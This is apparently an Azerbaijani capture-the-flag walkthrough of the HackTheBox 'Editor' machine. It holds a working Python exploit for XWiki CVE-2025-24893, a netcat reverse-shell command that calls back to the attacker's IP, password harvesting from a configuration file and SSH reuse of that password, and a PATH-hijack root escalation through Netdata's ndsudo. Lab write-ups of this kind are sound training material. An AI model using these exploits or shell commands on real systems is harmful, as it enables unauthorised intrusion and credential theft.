# HackTheBox - Editor Maşınının Sızma Testi

## 1. Kəşfiyyat və Port Taraması

**Əməliyyat:** İlk olaraq hədəf sistemin açıq portlarını və xidmətlərini müəyyən etmək üçün Nmap vasitəsi ilə port taraması edirik.

```bash
nmap -sV 10.10.11.80
```

**Açıqlama:** 
- `-sV` parametri: Açıq portlarda işləyən xidmətlərin versiyalarını müəyyən etmək üçün istifadə olunur.
- Nəticədə 3 açıq port aşkar edildi: SSH (22), HTTP (80) və HTTP (8080).

**Nəticə:**
```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
```

## 2. DNS Konfiqurasiyası

**Əməliyyat:** Domen adını yerli DNS qeydinə əlavə etmək.

```bash
echo '10.10.11.80 editor.htb' | sudo tee -a /etc/hosts
```

**Açıqlama:**
- `editor.htb` domen adını yerli sistemimizin host faylına əlavə edirik.
- Bu, brauzerdə domen adı ilə sayta daxil olmağa imkan verir.

## 3. Veb Tətqiqatı

**Əməliyyat:** 80 və 8080-ci portlarda işləyən veb saytların tədqiqi.

**Açıqlama:**
- 80-ci portda sadə bir veb səhifə işləyir.
- 8080-ci portda XWiki xidməti aşkar edildi (Jetty 10.0.20).
- XWiki-nin bu versiyasında RCE (Remote Code Execution) zəifliyi olduğu müəyyən edildi.

## 4. Reverse Shell Hazırlığı

**Əməliyyat:** Geri shell qəbul etmək üçün Netcat ilə dinləyici başlatmaq.

```bash
nc -nvlp 4444
```

**Açıqlama:**
- `-n`: DNS sorğularını dayandırır
- `-v`: Ətraflı məlumat verir
- `-l`: Dinləmə modunu aktivləşdirir
- `-p 4444`: 4444-cü portda dinləyir

## 5. XWiki RCE Zəifliyinin İstismarı

**Əməliyyat:** XWiki-dəki CVE-2025-24893 zəifliyindən istifadə edərək kod icrası.

**Exploit skripti (exploit.py):**
```python
#!/usr/bin/python3
import argparse
import urllib.parse
import requests
import sys

def parse_arguments():
    parser = argparse.ArgumentParser(description='CVE-2025-24893 exploit')
    parser.add_argument("-t", "--target", type=str, required=True)
    parser.add_argument("-c", "--command", type=str, required=True)
    return parser.parse_args()

def exploit(target, command):
    url_payload = f"{target.rstrip('/')}/xwiki/bin/view/Main/SolrSearch?media=rss&text="
    original_payload = f'}}}}{{{{async async=false}}}}{{{{groovy}}}}"{command}".execute(){{{{/groovy}}}}{{{{/async}}}}'
    encoded_payload = urllib.parse.quote(original_payload)
    vulnerable_endpoint = f"{url_payload}{encoded_payload}"
    requests.get(vulnerable_endpoint, verify=False, timeout=15)

if __name__ == "__main__":
    args = parse_arguments()
    exploit(args.target, args.command)
```

**İstismar əmri:**
```bash
python3 exploit.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.14.112 4444 -e /bin/bash'
```

**Açıqlama:**
- Skript XWiki-nin SolrSearch funksiyasındaki zəiflikdən istifadə edir.
- Groovy skripti vasitəsilə sistem əmri icra edilir.
- `busybox nc` əmri ilə geri shell bağlantısı qurulur.

## 6. Şifrələrin Axtarışı

**Əməliyyat:** XWiki konfiqurasiya fayllarında həssas məlumatların axtarışı.

```bash
cat /etc/xwiki/hibernate.cfg.xml | grep password
```

**Açıqlama:**
- `hibernate.cfg.xml` faylı XWiki-nin verilənlər bazası konfiqurasiyasını saxlayır.
- `grep password` əmri ilə şifrə parametrləri axtarılır.
- `theEd1t0rTeam99` şifrəsi aşkar edildi.

**Nəticə:**
```
<property name="hibernate.connection.password">theEd1t0rTeam99</property>
```

## 7. Oliver İstifadəçi Hesabına Giriş

**Əməliyyat:** Aşkar edilən şifrə ilə SSH bağlantısı qurmaq.

```bash
ssh oliver@editor.htb
```

**Açıqlama:**
- `ssh` əmri ilə uzaq serverə bağlanırıq.
- Şifrə soruşulduqda `theEd1t0rTeam99` daxil edirik.
- Müvəffəqiyyətli girişdən sonra Oliver istifadəçi mühitinə daxil oluruq.

## 8. User Flag-in Tapılması

**Əməliyyat:** İstifadəçi qovluğunda flag faylının axtarışı.

```bash
ls /home/oliver
cat /home/oliver/user.txt
```

**Nəticə:** `b235c49315d6380f345c1b53c8936664`

## 9. İmtiyaz Yüksəltmə Üçün Axtarış

**Əməliyyat:** SUID biti təyin edilmiş faylların axtarışı.

```bash
find / -type f -perm -4000 -user root 2>/dev/null
```

**Açıqlama:**
- `find /` - kök qovluqdan axtarışı başlat
- `-type f` - yalnız faylları axtar
- `-perm -4000` - SUID biti təyin edilmiş faylları tap
- `-user root` - sahibi root olan fayllar
- `2>/dev/null` - xəta mesajlarını gizlət

**Nəticə:** Netdata-nın `ndsudo` ikili faylı aşkar edildi.

## 10. Netdata Zəifliyinin İstismarı

**Əməliyyat:** CVE-2024-32019 zəifliyindən istifadə edərək root imtiyazları əldə etmək.

**Exploit kodu (exploit.c):**
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);  // İstifadəçi ID-ni root et
    setgid(0);  // Qrup ID-ni root et
    system("/bin/bash");  // Shell başlat
    return 0;
}
```

**Yerli sistemdə kompilyasiya:**
```bash
gcc exploit.c -o nvme
```

**Faylın köçürülməsi:**
```bash
scp nvme oliver@editor.htb:/tmp/
```

**İstismar əməliyyatı:**
```bash
cd /tmp
chmod +x nvme  # Faylı icra ediləbilən et
export PATH=/tmp:$PATH  # PATH-a /tmp qovluğunu əlavə et
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```

**Açıqlama:**
- `ndsudo` ikili faylı PATH-dakı `nvme-list` əmrini axtarır.
- PATH-ə /tmp qovluğunu əlavə etdiyimiz üçün bizim yaratdığımız `nvme` faylını icra edir.
- `nvme` faylı root imtiyazları ilə shell başladır.

## 11. Root Flag-in Tapılması

**Əməliyyat:** Root qovluğunda flag faylının oxunması.

```bash
cat /root/root.txt
```

**Nəticə:** `97d5c2c13b2a487a937d116cb257a578`

## 12. Təmizlik (Opsional)

**Əməliyyat:** Yaradılan faylların və dəyişiklərin təmizlənməsi.

```bash
# Uzaq sistemdə:
rm /tmp/nvme
unset PATH

# Yerli sistemdə:
sed -i '/editor.htb/d' /etc/hosts
```

**Xülasə:** Bu sızma testində XWiki RCE zəifliyindən istifadə edərək ilkin giriş əldə edildi, konfiqurasiya faylından şifrə aşkarlandı, SSH ilə istifadəçi hesabına daxil olundu və Netdata-nın SUID zəifliyindən istifadə edərək root imtiyazları qazanıldı.
